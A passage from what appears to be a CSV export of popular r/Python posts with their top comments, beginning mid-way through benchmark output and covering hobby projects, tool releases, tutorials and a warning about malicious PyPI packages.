    go: Mean +- std dev: [cp] 631 ms +- 13 ms -> [xx] 612 ms +- 16 ms: 1.03x faster
    hexiom: Mean +- std dev: [cp] 32.2 ms +- 1.4 ms -> [xx] 31.2 ms +- 2.5 ms: 1.03x faster
    json_dumps: Mean +- std dev: [cp] 38.1 ms +- 1.3 ms -> [xx] 37.5 ms +- 1.5 ms: 1.02x faster
    json_loads: Mean +- std dev: [cp] 63.3 us +- 2.3 us -> [xx] 59.4 us +- 2.8 us: 1.06x faster
    logging_silent: Mean +- std dev: [cp] 555 ns +- 18 ns -> [xx] 536 ns +- 17 ns: 1.04x faster
    meteor_contest: Mean +- std dev: [cp] 269 ms +- 11 ms -> [xx] 262 ms +- 9 ms: 1.03x faster
    nbody: Mean +- std dev: [cp] 508 ms +- 12 ms -> [xx] 495 ms +- 9 ms: 1.03x faster
    nqueens: Mean +- std dev: [cp] 328 ms +- 9 ms -> [xx] 317 ms +- 8 ms: 1.03x faster
    pathlib: Mean +- std dev: [cp] 46.2 ms +- 1.6 ms -> [xx] 44.8 ms +- 1.0 ms: 1.03x faster
    pickle: Mean +- std dev: [cp] 24.1 us +- 1.0 us -> [xx] 23.3 us +- 0.9 us: 1.04x faster
    pickle_dict: Mean +- std dev: [cp] 65.1 us +- 1.7 us -> [xx] 63.7 us +- 1.6 us: 1.02x faster
    pickle_list: Mean +- std dev: [cp] 9.43 us +- 0.29 us -> [xx] 9.29 us +- 0.26 us: 1.02x faster
    pickle_pure_python: Mean +- std dev: [cp] 1.39 ms +- 0.06 ms -> [xx] 1.34 ms +- 0.05 ms: 1.04x faster
    pidigits: Mean +- std dev: [cp] 207 ms +- 6 ms -> [xx] 200 ms +- 5 ms: 1.03x faster
    pyflate: Mean +- std dev: [cp] 1.96 sec +- 0.04 sec -> [xx] 1.94 sec +- 0.03 sec: 1.01x faster
    richards: Mean +- std dev: [cp] 206 ms +- 6 ms -> [xx] 210 ms +- 9 ms: 1.02x slower
    scimark_fft: Mean +- std dev: [cp] 1.54 sec +- 0.03 sec -> [xx] 1.55 sec +- 0.02 sec: 1.01x slower
    scimark_lu: Mean +- std dev: [cp] 575 ms +- 16 ms -> [xx] 568 ms +- 14 ms: 1.01x faster
    sqlalchemy_imperative: Mean +- std dev: [cp] 44.2 ms +- 1.5 ms -> [xx] 45.1 ms +- 2.1 ms: 1.02x slower
    sqlite_synth: Mean +- std dev: [cp] 8.28 us +- 0.31 us -> [xx] 8.08 us +- 0.32 us: 1.02x faster
    sympy_integrate: Mean +- std dev: [cp] 56.1 ms +- 1.7 ms -> [xx] 57.9 ms +- 3.0 ms: 1.03x slower
    sympy_sum: Mean +- std dev: [cp] 433 ms +- 10 ms -> [xx] 442 ms +- 14 ms: 1.02x slower
    unpickle: Mean +- std dev: [cp] 40.7 us +- 1.7 us -> [xx] 39.6 us +- 1.1 us: 1.03x faster
    xml_etree_parse: Mean +- std dev: [cp] 462 ms +- 8 ms -> [xx] 454 ms +- 12 ms: 1.02x faster
    xml_etree_iterparse: Mean +- std dev: [cp] 330 ms +- 11 ms -> [xx] 326 ms +- 8 ms: 1.01x faster
    xml_etree_process: Mean +- std dev: [cp] 234 ms +- 9 ms -> [xx] 232 ms +- 4 ms: 1.01x faster
    
    Benchmark hidden because not significant (28): 2to3, chameleon, crypto_pyaes, deltablue, django_template, logging_format, logging_simple, mako, python_startup, python_startup_no_site, raytrace, regex_compile, regex_dna, regex_effbot, regex_v8, scimark_monte_carlo, scimark_sor, scimark_sparse_mat_mult, spectral_norm, sqlalchemy_declarative, sympy_expand, sympy_str, telco, tornado_http, unpack_sequence, unpickle_list, unpickle_pure_python, xml_etree_generate
    
    Geometric mean: 1.01x faster"
Today it clicked,r8fsxy,2021-12-04 10:52:20,"I was walking along the sidewalk yesterday thinking about how frustrated I used to get not knowing how to do the most basic programming. Then I realized that in a single day I had written a script that would have taken me months prior. 

Right then I stopped, smiled and danced a little. I found myself realizing that I had really understood the code, that I had thought logically about solutions to the problem I needed to automate, and I implemented problem solving without having to look many things up on stack overflow. 

It’s been about a year now since I’ve started my graduate research assistantship at the university. I pretty much got thrown in head first. 
The first day they handed me 80 Gigabytes of satellite data and told me to go read 18 pixels from each of the individual files. I was so discouraged but I kept on going and just put one foot in front of the other. 

I made the deadlines with code that functioned. I turned in products and accepted the criticism. I went home feeling like shit a lot and feeling discouraged. But today, I feel like it was all worth it. 

I say all of this to just be a voice of encouragement to all the new folks out there. You can do this. As Dory from the finding Nemo would say, “just keep swimming.” Keep going friends.

TLDR: Today I realized I’m much better at python than I used to be. I felt discouraged a lot as a beginner. Now, I can write a script super quick. Don’t give up, friends. Just keep swimming.",Congratulations!
We're the core team behind the popular Python autoformatter: Black. AMA!,plvtlx,2021-09-11 07:07:34,"Hello everyone!

I'm Richard S. aka ichard26 and I'm one of the core team responsible for psf/black ([repo](https://github.com/psf/black), [docs](https://black.readthedocs.io/en/stable)), a project dedicated to making sure your ~~car~~ code is painted black. Black is notable for its general lack of configuration and secondary focus on reducing diff noise.

This AMA will be at least (we have a sizable team of 9 folks) joined by

* [Łukasz Langa](https://github.com/ambv) \-- creator, maintainer & BDFL
* [Jelle Zijlstra](https://github.com/JelleZijlstra), /u/ucucha \-- maintainer
* [Zsolt Dollenstein](https://github.com/zsol) \-- maintainer
* [me](https://github.com/ichard26)! -- maintainer

**The official start time for the AMA will be 17:00pm UTC**, before then this post will exist to collect questions in advance. Since we live all over North America and Europe, **it's likely we'll answer questions before & after the official start time by a significant margin**.

Black allows you to write your Python code however you like, and let it handle fixing your coding style for others, making it easier to just program and avoid time hunting down where your code violates style guide rules.

I can't really comment on the early bits of the project's life as I only joined in mid-2020 so here's a quote from Łukasz Langa, both the creator and BDLF:

>At the time I was working for Facebook on their internal use of Python. There were over 20 million lines of code maintained and too much time during code review was wasted fighting over formatting. Plus different projects ended up having muuuch different coding styles, including some ex-Googlers forcing use of 2-spaced indents in their favorite projects. It was a mess.  
>  
>At first I tried adopting an existing code formatter, YAPF. \[...\] However, we couldn't make it work for our 20 million lines of code. It was very configurable but also very inconsistent because of it. \[...\]  
>  
>So I started working on my own. ""How hard can it be?"" Well, it took me 6 weeks to get to the first alpha release. When I put it out on March 14th 2018 (Pi Day!), it got 500 GitHub stars in one day, Kenneth Reitz started using it right away and tweeted about it, and soon after we got pretty big adoption.

And after a few short years, it's become the most popular autoformatter for Python. FWIW just only a few days ago Black surpassed 100 million downloads on PyPI, but Black isn't stopping anytime soon. It'll still exist painting code in layers of black paint!

If you want to see how Black would reformat your code, [you can try it online](https://black.vercel.app/) and paste your code to see how it changes.

Ask us anything! Post your questions and upvote the ones you think are the most important and should get our ~~paintbrushes~~ replies.

\~ richard ❀, on behalf of the team

\--

* [Announcement post](https://www.reddit.com/r/Python/comments/pihblq/join_us_for_an_ama_with_the_developers_of_black)
* [Code repository](https://black.now.sh/)
* [Contributing guidelines](https://black.readthedocs.io/en/latest/contributing/)
* [Chat with us on Python Discord](https://discord.gg/RtVdv86PrH)","I want to thank /u/ichard26, /u/ucucha, /u/zsol, and /u/ambv, as well as everyone who joined in and asked amazing questions of the Black Formatter Team! I'd especially like to thank /u/ichard26 who worked hard with me to set up and organize this event. This thread will stay up and might be some more answers as the week goes on, so if you've still got a question, feel free to ask!.

Thank you everyone!

---

Our guests include /u/ichard26 and [here's](https://www.reddit.com/r/Python/comments/plvtlx/were_the_core_team_behind_the_popular_python/hcdfh02/) a bit about them,

and /u/ucucha whose introduction is [here](https://www.reddit.com/r/Python/comments/plvtlx/were_the_core_team_behind_the_popular_python/hcdj8cs/)

/u/zsol has an introduction [here](https://www.reddit.com/r/Python/comments/plvtlx/were_the_core_team_behind_the_popular_python/hceuze1/)

/u/ambv's Intro is [over here](https://www.reddit.com/r/Python/comments/plvtlx/were_the_core_team_behind_the_popular_python/hcf4ehv/)"
"I built a virtual personal fitness trainer that gives you live feedback as you work out! (Python, OpenCV, PyTorch, Kivy, SocketIO)",fn134k,2020-03-22 22:58:05,,Cool work. Looks very complicated. This could be repurposed/extended for in-home rehabilitation though
Pandas 2.0 Released,12ahvyk,2023-04-03 19:48:12,[https://pandas.pydata.org/docs/dev/whatsnew/v2.0.0.html](https://pandas.pydata.org/docs/dev/whatsnew/v2.0.0.html),The `Index` updates are great news; it was so annoying carefully casting a column to `int8` to save RAM only to have it casted to `int64` as soon as you used e.g. `stack`.
I created a script that allows you to store any file (encrypted or not) in an image using steganography,yaqoxd,2022-10-22 23:30:23,"# [Link to the repo](https://github.com/carlospuenteg/File-Injector)

This **30MB** **image** contains an **encrypted** **18.7MB** `.zip` **file** stored as **noise**.

&#x200B;

[This example image has been resized, so the file can't be recovered from it](https://preview.redd.it/mde2m847mdv91.png?width=2400&format=png&auto=webp&s=c98a1d0b06e9038d25451ed75aab4cba158e5c90)",Cool project!
I used python to automate a task that would take some hours of tedious manual labor!,psfdnh,2021-09-21 17:35:33,"Hello,

TLDR: Managed to automate something practical which is a milestone for me.

I recently found some resources I wanted to use on the net. I wanted to pull the pages to pdf or some other file type so as to have it on my kindle and just have it available offline. The issue was the resources are some 500 pages and are scripted so using wget was getting me nowhere as the content of the page wasn't being downloaded. I had previously tried querying the net for a solution to this but had at that point come up empty.

Instead I decided to use python and the pyautogui and make a script that would perform the command inputs through keyboard and mouse... aaaaaand.... it works!

I've so far managed to get through 3/5 of the resources with this. And the best thing is I don't have to do it myself.

Is it pretty? Its not ugly, but its not having an open casket funeral.

Does it work perfectly? No, I have to sit and glance over on it every few minutes to make sure it hasn't caught itself in some sort of loop driven by the existential dread of realization that this is all this program is going to do.

but does it work? YES!

And to be honest I can't be more proud of it for that reason. I've written some code that has untied my hands and is allowing me to work while it does its job. This is the first time I've been able to accomplish this in the 5 or so years I've had my on/off relationship with coding. All it took was a couple of hours of tinkering and getting things just right. Way less than if I would have to do it by hand. And I have to add that I enjoyed this as a process. Finding all the edge cases that made it not work, adapting it so it would process the commands functionally, dodging pitfalls because of differences from page to page. I mean it even uses the copy paste function of pyperclip to test text in different parts of the page to determine what it should do.

I also did it in python. Which is kind of surprising to me. Mostly because I don't really like python.

Well, I enjoy using it, cause of how simple and adaptive it is. But I just don't enjoy the structure or the method of invoking classes etc. It may be similar to the other languages I've been using, but its just not my cup of coffee. This experience just proved to me it's not about the language itself, its about how you use it and I won't be dropping python any time soon.

I just wanted to write this post because I think I've reached a milestone in coding that has previously eluded me and that is practical application of coding to make my day a little easier and I couldn't have achieved it without python and the python community.",Congrats! Next step is continuous improvement!
"The online course for ""Automate the Boring Stuff with Python"" is free to sign up this week.",bzqz6j,2019-06-12 21:04:37,,The discount code to use to sign up for free is here: https://www.udemy.com/automate/?couponCode=SCHOOLS_OUT2
Congrats /r/python/ for having one of the most positive commenter communities on Reddit!,5hkp59,2016-12-10 23:50:04,"I have been working this last week on a little side projects that runs top comments from the top subreddits through the  [NLTK Sentiment Analyzer] (http://www.nltk.org/api/nltk.sentiment.html) [Vader Module] (http://www.nltk.org/api/nltk.sentiment.html#module-nltk.sentiment.vader) to determine how positive/negative a subreddits comments are.  /r/python/ is currently ranked #6 out of 445 subreddits!

View results here:
[opfeels.com](http://opfeels.com)
[opfeels.com/r/python/](http://opfeels.com/r/python/)

EDIT: Parsing new comments has dropped us down to #10.  Still worthy of congratulations!",Is it with or without Python 2 vs 3 threads?
Python+OpenCV examples+GTAV = Fun!,31mom3,2015-04-06 22:20:04,,"This example is included in OpenCV and is based on *Visual Object Tracking using Adaptive Correlation Filters*. The source code for the example can be found here:

[https://github.com/Itseez/opencv/blob/master/samples/python2/mosse.py](https://github.com/Itseez/opencv/blob/master/samples/python2/mosse.py)

If there is enough interest I could detail the inner-workings of the algorithm on the [PyImageSearch](http://www.pyimagesearch.com) blog.

UPDATE: Wow, that's a lot of upvotes! I'll be sure to cover it!"
User controlled Turtle cubes,7nfgw6,2018-01-01 22:54:26,,MAKE THE GAMECUBE LOGO
Comprehensive Python Cheatsheet,8715iw,2018-03-25 22:54:41,,"What's the purpose to doing 
`file.write(json.dumps())` vs `json.dump(file)`?

The cheatsheet lists the first, but it seems more concise (and maybe has a performance benefit?) to do the second. "
"Python 3.12 speed plan: trace optimizer, per-interpreter GIL for multi-threaded, bytecode specializations, smaller object structs and reduced memory management overhead!",yj2qj7,2022-11-01 16:15:20,,I love how well planned and effective this all seems to be. It has got to be tough to optimise a project of this age and complexity.
Learning Python changed my life,p6pxko,2021-08-18 20:14:34,"My first encounter with Python happened because of a small lie.

During my application to an internship that required me to build the control system of robots using Python, I lied to my recruiter about already possessing beginner-level programming skills in python.

Thankfully, he didn't ask me anything else and accepted me for the internship program. But since that day, I have religiously practiced Python every day in my life, so that I wouldn't have to lie to anyone else!

In my beginner days, I did the whole dance to learn Python.

I did a lot of free courses on the internet.

I solved every problem I could find on any Python topic again and again. And then again!

Initially, I only did it to do excel at my thesis. But eventually, I fell in love with this simple language.

So much so that I started applying for Python programming jobs even before my Masters in Transportation Engineering got over and happily accepted the job offer when I got one.

Websites I followed for learning
I would like to provide the list of websites, that were of great help when I began programming.

2015 was not the year when there tons of Medium or Dev posts on learning Python. So, finding something useful was actually tricky.

I was a student and therefore, could not afford any paid courses. So I had to stick to the free websites that were available at that time.

1. Stack Overflow
2. Python for everybody course on Coursera

Shout out to Charles Severance for helping me land my first job.

3. Learn Python the Hard Way 

For those of you confused about your career decisions, I would definitely recommend that Python is a great programming language to learn. It provides a lot of job opportunities and doesn't have a huge learning curve. Check out my blog on [5 career driven decisions to learn Python](https://www.pylenin.com/blogs/5-reasons-to-learn-python/).","Trust me recently i used python on our power plant to scrape fuel consumption reading from one of our clients fuel monitoring applications. We now use this data in our own web application to help in calculating our generator overall efficency. 

This saves my company from having to buy an expensive ultrasonic flow sensor that would match the accuracy of that used by our fuel supply contractors. 

Im still looking for more projects to sharpen my python skills because I learn best through these expereinces. So if you have any you want to throw at me or even a thread that might help FEEL FREE TO SHARE !📣"
I created a Python library that encodes files into images and videos. This little video holds about 170KB. (Warning- flashing lights),buvrkh,2019-05-31 01:12:25,,"Funny thing you can do :

1 - encode a file into a video

2 - upload this video to YouTube

3 - now anyone can download the video and get the file back and YouTube is basically a big file uploading platform"
How I saved >1000 years of CPU time using my adaptive sampling package for this quantum mechanics plot [OC],cl1lrv,2019-08-02 16:59:20,,"This is a **quantum physics** calculation in progress. 

When evaluating a function numerically we would like to sample it more densely in the interesting regions instead of evaluating it on a manually-defined homogeneous grid. 
Together with my colleagues, we wrote an open-source Python software package Adaptive that evaluates the function at the optimal points by analyzing existing data and planning ahead on the fly.
With a few lines of code you define your goal, evaluate functions on a computing cluster, and live-plot the data.
It performs averaging of stochastic functions, interpolation of vector-valued one and two-dimensional functions, and one-dimensional integration.

This figure is from one of my recent papers [Enhanced proximity effect in zigzag-shaped Majorana Josephson junctions](https://arxiv.org/pdf/1903.06168.pdf) Fig. 4(e).

What you see here is how the calculation progresses in time. You see that as time progresses it starts to find the narrow lines (which have a physical meaning). For aesthetic purposes, I change the colormap slowly which is meaningless but pretty. The vertices (corners) of the white triangles on top of the plot represent the points are which the underlying function is evaluated. The >1000 years of computation time is based a comparison with a homogeneous grid. If we take the size of the smallest triangle, the computation time with adaptive (2 weeks on 300 cores), and assume that all the features larger than the smallest triangles have been resolved, then the calculation would have taken 3134 years. 

You can recreate this video by using [this]( https://gist.github.com/basnijholt/7aaeb7b9c506f830e6791d264a6cf467) script and [this data](https://www.dropbox.com/s/6y6mz6w0enahzhp/data.pickle?dl=0) .
The whole source code for reproducing the data in the paper is [here](https://zenodo.org/record/2578027).

See (star) ⭐️ the repo on [github.com/python-adaptive/adaptive](https://github.com/python-adaptive/adaptive) and the documentation on [adaptive.readthedocs.io](http://adaptive.readthedocs.io).

Try `pip install adaptive[notebook]` or `conda install adaptive` :-)

You can also run Adaptive code live in Binder [here](https://mybinder.org/v2/gh/python-adaptive/adaptive/master?filepath=learner.ipynb)!

P.S. adaptive has already been used in several other scientific publications, see the [gallery](https://adaptive.readthedocs.io/en/latest/usage_examples.html)!"
Using dice to recreate a picture,a4g5im,2018-12-09 08:14:26,,"Made some scripts using OpenCV and numpy to convert an image to a group of dice inspired by [this post](https://www.reddit.com/r/DIY/comments/a411hu/i_made_a_portrait_of_a_friend_out_of_13000_dice/).

This animation consists in an array of dice which are randomly rolling until they make the complete picture based on a grayscaled version of the original.

[Here's the code](https://gitlab.com/r-russo/dice-image) if anyone is interested. Inside there are three scripts: draw.py which animates the dice using pygame, animate.py which generates the image file to create a video later and save.py which saves the final result.

Edit: Thanks for the feedback! According to suggestions by /u/LightShadow and /u/captmomo I added a few things. First of all, the image size is kept the same as the original (which wasn't the case before) and before generating the dice, now it does dithering on the grayscaled image. In this case, the picture is made by black or white dots, so the comparison between a die and pixels is easier. The new distance declared in this case is counting how many black dots are equal in the die and the dithered picture. It looks different, I don't know if it looks actually better but I'm satisfied.

[New result](https://imgur.com/GQOKLm7)"
"Hey, I made a Google reCaptcha solver bot too...",8oqp7v,2018-06-05 21:14:38,,"So what is the technique here? 

Something like Selenium to control a bunch of browsers? How do you get the sound? Intercepting the requests or recording what is played?"
Best update ever for my 3D renderer made in Python! Here are some renders:,bmtqeu,2019-05-10 12:08:41,,dope man! keep up the good work!
do the two snakes have a name,xqot6g,2022-09-29 05:21:42,,"**Args and Kwargs**

Best answer from the last time this was asked: https://www.reddit.com/r/Python/comments/ue18y6"
"This is my first Python script... it automates creating a new React app, adds a GitHub repo and origin, opens the project in VS Code and starts the development server!",cmrtt8,2019-08-06 23:12:39,,My first Python program printed ‘Hello World’...
Steve Wozniak’s operating system rewritten in Python to learn how it works,s8e1lg,2022-01-20 16:15:50,"Hi there!
Here is ‘helicopter view’ of 256 bytes Apple co-founder Steve Wozniak’s operating system for Apple-1 rewritten in Python. It has a kind of shell as UI and simple Keyboard and Display ‘drivers’ as interface to hardware.

It is an example of basic functions of all the operating systems - to work with hardware to provide interface to user’s programs and to manage that hardware resources. 

Source code to play with: https://github.com/smartykit/apple1/blob/master/WozOS.py","Woz is a legend, I'll have to check this out. thanks for the share"
"Just a little pixelart to python array of strings converter I made this weekend, so you can display your pixelarts in the python's command line interface",datbcm,2019-09-29 18:07:28,,"Hey, that’s pretty cool. Do you plan on uploading it on github?"
PSA - Malicious software libraries in the official Python package repository (xpost /r/netsec),709vch,2017-09-15 21:37:21,,"Just wanted to share this. It really questions how we often blindly trust the software we download through tools like pip. Like it says in the article, the malicious code isn't anything harmful to your system, but it's still good to get rid of any of these illegitimate packages. It almost seems like someone was just trying to collect statistics on how many people could have been tricked by this. "
I wrote a python program for scraping Ebay to find a cheap used espresso machines under $200.,re6nz4,2021-12-12 03:17:33,"I plan to make it so that I get notified when new machines are being sold under 300$. My code is not too pretty but here it is. [https://github.com/Hogstem/LearningStuff/blob/main/EbayScrape](https://github.com/Hogstem/LearningStuff/blob/main/EbayScrape).

https://reddit.com/link/re6nz4/video/gg4tgti7qy481/player",r/oddlyspecific
I created a lightweight file copier/sorter to help with high school.,m9y1k8,2021-03-21 22:40:22,"As a 9th grader, I have many unorganized files because of online school. Not just that, I also do photography and sometimes the file names on my camera match up with ones at a specific directory even if the photograph is different which makes it a pain to copy. Though avoidable problems, I decided to use this as a chance to create a program. I created **autosort.**

[Preview](https://i.redd.it/dw57a4giwdo61.gif)

Autosort has the ability to copy files from several directories into folders with other options such as not overwriting duplicate files, removing metadata, sorting by file type, etc!

Github: [https://github.com/vihdutta/autosort](https://github.com/vihdutta/autosort)

I am really proud of this program and I hope you all have some thoughts to share with me!

&#x200B;

EDIT: My Github is back now! You can access it through the link above.",Neat! One idea to extend the file duplication check is to look into pythons hashlib library. You can check whether the contents of any two files are the same and then offer another option like keeping the latest.
"[TIL] Python silently concatenates strings next to each other ""abc""""def"" = ""abcdef""",jgj206,2020-10-23 16:16:06,"```
>>> ""adkl"" ""asldjk""
'adklasldjk'
```
and this:
```
>>> [""asldkj"", ""asdld"", ""lasjd""]
['asldkj', 'asdld', 'lasjd']
>>> [""asldkj"", ""asdld"" ""lasjd""]
['asldkj', 'asdldlasjd']
```

Why though?","Even Guido has been caught by accidentally leaving out commas, but it seems that implicit concatenation was deemed more useful than dangerous in the end.  
&nbsp;

    # Existing idiom which relies on implicit concatenation
    r = ('a{20}'   # Twenty A's
         'b{5}'    # Followed by Five B's
         )
    
    # ...which looks better than this (maybe)
    r = ('a{20}' + # Twenty A's
         'b{5}'    # Followed by Five B's
         )"
"Response to overwhelming ""I made this"" posts.",gdqfyz,2020-05-05 11:38:08,"I have recently seen the rant against these posts flooding this subreddit and I agree with many of the points.
1. This sub is filled with creations more than discussion.
2. The original purpose of this sub was not this.

With this, I have decided to form a new community solely dedicated to people's creations: r/madeinpython While yes, these posts of your creations are great, not everyone wants to see this on this subreddit, so if we offloaded all this to the new sub, there will be less complaints and everyone who loves this content can go there. Thanks for coming to my Ted talk, please don't hate me :)","I think the solution to this, like similar issues in other subs, is to enforce flairing, so that users can filter in or out flairs, [e.g. using this guide](https://www.reddit.com/r/modhelp/comments/czx9so/filtering_by_flair_a_guide_for_desktop_old_and/)."
"I made a system to automate attendance in my college. It uses PyQt5 for UI, and features dynamic authentication, automated mailing, time-bound implementation, schedule synchronization, warning trigger, along with a few configuration options. Thank you r/python community :)",e0x1wt,2019-11-24 18:48:23,,"My friends' thesis was about automated attendance. First, they taught QR code but lecturers say a student can show other students QR code as well so they switched to fingerprint. How do you plan to solve that issue."
"Me and a few friends have been using python to mod a dead version of Minecraft for a few months and we’ve just made a blog post on it, check it out!",ka1nqm,2020-12-10 05:57:09,"Here’s the link to the post: https://dev.to/nobody5050/how-a-small-team-of-developers-revived-a-dead-version-of-minecraft-3akn

Besides that the general gist is this: Minecraft pi edition hasn’t gotten an update in 7 years so we did it ourselves and have already enabled the hidden survival mode among a bunch of other things. Any questions can be asked in the comments, thanks!

GitHub: https://GitHub.com/mcpi-devs/mcpil",This is fantastic! I remember messing around with MCPI! Keep up the awesome work!
I also made a space invader game with Python Crash Course. Used music and sprites from Zelda.,c8f9e5,2019-07-03 05:22:48,,"So I began learning Python lately and after seeing [u/sachin\_mahesh](https://www.reddit.com/user/sachin_mahesh/)'s posts I decided I'll give it a try as well but with some changes. I added sprites and music (which is what I'm changing near the end of the video) from Zelda and also a controllable Bombchu.

&#x200B;

 edit: [https://github.com/shammy8/Lynel](https://github.com/shammy8/Lynel)"
"Self-driving vehicles with Python, TensorFlow, OpenCV, and Grand Theft Auto 5",665jqt,2017-04-19 04:41:12,"I've put out a so far 13-part series on creating a self driving vehicle with Grand Theft Auto 5. 

**[A brief taste of what we're doing](https://twitter.com/Sentdex/status/854394799104962561)**

..or check out the latest video in the series: **[a more interesting self-driving AI](https://www.youtube.com/watch?v=nWJZ4w0HKz8)**, especially near the end. 

This is by no means a serious look into self-driving vehicles, it's just for fun, and so far the latest project has been to make a motorcycle that speeds through traffic, attempting to stay on the road and evading all the other slow drivers. 

We do all of this with basic(ish...) tools and concepts. We're reading the screen by taking screenshots with pywin32, seeing about 20 FPS with the neural network, sending keys with direct input, and then doing some analysis with OpenCV, otherwise also training with a convolutional neural network in TensorFlow. 

The goal of the series is more to show you how you can take just about whatever game you want, mapping the screen to inputs, training a neural network, and then letting the network play the game. 

It's an ongoing project, and is also **[open-source](https://github.com/sentdex/pygta5/)**

Here's a link to the **[self-driving tutorials](https://pythonprogramming.net/game-frames-open-cv-python-plays-gta-v/)**, which starts at the beginning. We start to use the neural network in **[part 9](https://pythonprogramming.net/self-driving-car-neural-network-training-data-python-plays-gta-v/)**

That's all for now, more AI in GTA to come.",Always good stuff from your channel. Thanks a lot for helping me learn
Anyone else learning Python as a hobby?,v4mb41,2022-06-04 18:42:34,"Hi!

So I started learning Python as a hobby about 2 weeks ago ago, and it has been fun.

It's extra fun because you have your own ""schedule"".
I sure as hell will not follow any career surrounding Python or coding in general, it's just a hobby.

This is the post to tell people how your journey has been going!","I learned Python for fun. I was making games as a hobby and taking part in gamejams.

Then I created a tool that will help me at the job unrelated to programming (Theoretical calculations in chemistry)

Few years later...

I work as Django Backend Developer."
What routine tasks do you automate with programs?,70udwq,2017-09-18 19:32:02,"Recently my girlfriend told me that I don't pay enough attention on her Instagram account, I don't like wasting my time checking feed every time so I wrote a python script and created a cron job which starts every 2 minutes and checking if there are new posts and like them if needed. What did you recently automated?

Source code of my script on [GitHub](https://github.com/dzaytsev91/mygf-instagram)","This is great.

My son has asthma. So every time he takes his inhaler or breathing treatment he pushes a button that's connected to my Raspberry Pi. The Pi records it and trains a predictive model (using weather, allergy, and air quality data) to predict when he'll need his inhaler. Then it emails the school nurse, and me, notifying her that there is a high likelihood that he'll need some preemptive treatment today.

**EDIT**:

Wow, didn't think this many people would be interested in this project! Yes I will definitely post to this subreddit once I open source it (still a lot of work to be done). Currently I'm using a simple GLM that reaches a decent level of accuracy. I'd like to take into account other events that trigger his asthma like

1) did he play with animals

2) how long did he spend outside

3) how much energy he exerted (maybe get him a smart wearable for this? this one is a stretch I think)

3a) maybe heart rate? (a smart watch should be able to capture this right?)

Cleaning the data up is a bit tricky, but I think once I get some of this other data then the model will perform better. Also I'd like to connect the button (somehow) to the inhaler so that every time he uses it, it records it automatically so that he doesn't have to also push the button on the Pi.

I've taken a break on this project for a while but now I'm feeling it again!

I'll end up adding everything here: https://github.com/tmthyjames/AllergyAlert"
Easy to follow Python web scraping tutorial with the help of MITMProxy,ko4gh7,2021-01-01 11:50:37,"Hey r/python I posted this tutorial on how to access a private API with the help of Man in the Middle Proxy a couple of months back and thought I might reshare for those who may have missed it.

[https://www.youtube.com/watch?v=LbPKgknr8m8](https://www.youtube.com/watch?v=LbPKgknr8m8)

**Topics covered** 

* MITMProxy to observe the web traffic and get the API calls
* Requests to perform the API call in Python
* BeautifulSoup to convert the XML data
* Pandas to take the converted XML data and create a CSV file

If your 2021 new years resolution is to learn Python definitely consider subscribing to my YouTube channel because my goal is to share more tutorials!","Re MITMProxy, you can simply use Firefox/Chrome's dev tools. In the network tab, it shows all the requests, where you can see all you'll need."
I created a script that uses Python to calculate color infrared scenes (as well as others) using Landsat8 imagery. (GitHub repo in comments.),j7tb5q,2020-10-09 13:28:49,,Explain it like I’m 5?
"I know this isn't much, but I made Minesweeper using Python. Really proud how it turned out!",zuzx7r,2022-12-25 23:16:23,"[Link to GitHub](https://github.com/espy02/python-minesweeper) 

Any feedback would be appreciated",Cool little project. I like the well written readme with gif
Python will be the official programming language for education in France,9y972g,2018-11-19 04:00:29,,The US should follow suite and choose a national programming language as well. Then students can all grow up knowing the same programming language so they can converse about it in an easy way.
Short Python challenge : make this return True !,cje5yh,2019-07-30 01:10:48,,"The integers from -5 to 256 are singletons in Python so that means there can only be one instance of them (like None)

    >>> a = 256
    >>> b = 256
    >>> a is b
    True
    >>> a = 257
    >>> b = 257
    >>> a is b
    False

so the answer is -7"
New console-based spinner animations in Rich,kbsl1o,2020-12-13 01:05:30,,"Rich is a batteries-included terminal rendering library. One battery that has been missing for a while is ""spinners"", which are nice for indicating what your CLI app is doing.

The spinners are rendered in a background thread, which means you can write to the terminal as normal without breaking the visuals. There are a number of styles you can chose from which you can see in the video.

More details here...

[https://github.com/willmcgugan/rich#status](https://github.com/willmcgugan/rich#status)"
Why did I wait so long?,js3xlv,2020-11-11 15:42:11,"I have a Raspberry Pi I use to control my electric gates and outdoor lights. I'd written some C to do various things, having learnt a bit at university. Had to rebuild the system this week and my backups weren't complete so decided to rewrite my programmes in Python.

So much easier! I'm never going to have a career as a programmer anyway but the fact I don't need to faff around with compiling and makefiles is so refreshing.",This is really wholesome to hear this is what programming is always meant to be just get out there and solve some problems.
Using finite state machines to speed up an algorithm by a factor of 173.4 BILLION,n1qea7,2021-04-30 17:40:15,,"I love the use of finite-state machines, and how it helps you solve a question. But the ""speeding up by 170 billion"" is just clickbait. Any Algorithm that uses mathematics can be billions of times faster than the intentionally very slowest algorithm you can think of. 

What you're doing is providing a great alternative algorithm to the exclusion-inclusion algorithm, and having an alternative method in your toolbox is valuable in and of itself. Whether the speed of your algorithm or the inclusion/exclusion algorithm is faster is of no importance, and whether it is faster than having your computer count to 698,438,863,898,480,640 is not relevant at all in my opinion."
"The internet is down at work, fortunately I have my extensive library of high quality homemade games to keep me entertained",bs6hhw,2019-05-24 02:29:29,,No Global Thermal nuclear War?
I made a python script that polices your Spotify playlists.,jd9hvk,2020-10-18 11:56:43,"For background, some friends and I had a collaborative playlist going for a while when a random record label somehow got the link. They started spamming our playlist with their music and when we deleted all their songs they would either re-add them or delete all of ours.

This went on for way too long so I eventually decided to make a bot that checked in on the playlists and removed any songs added from non-whitelisted users. It also would save a backup of the playlist and be able re-add any removed songs. This was a pretty simple project but I thought id share the code in case anyone was having a similar issue.

HeHere'sres a link to the [GitHub Repo](https://github.com/MagicalTurtle/PlaylistPolice) , any suggestions are appreciated.",Never heard of this happening on spotify before! Cant you tell Spotify to block them or anything? I guess they dont have access control on those collaborative playlist?
Google has started a new video series teaching machine learning and I can actually understand it. [X-Post /r/programming],4f0x74,2016-04-16 15:11:53,,The second part of the series has also been released 3 days ago: https://youtu.be/tNa99PG8hR8
Wut,5zpe9e,2017-03-16 16:23:06,,what do they mean? an african or an european swallow?
"I built a simple Airbnb scraper to analyze cleaning fees so you don't have to. Nothing fancy. Hopefully, it's useful.",yjw3ji,2022-11-02 13:04:46,,"Thanks for sharing!
Did you know this website http://insideairbnb.com/ existed?
It provides scraped data from Airbnb
Since it's not continuously streaming it may not have the latest data, but could be useful if you don't need the most up-to-date data."
My first program(!) - new to coding. Time tracker for account managers on their clients.,9cfcmp,2018-09-03 04:41:37,,"For a first program, this is extremely impressive. Well done OP."
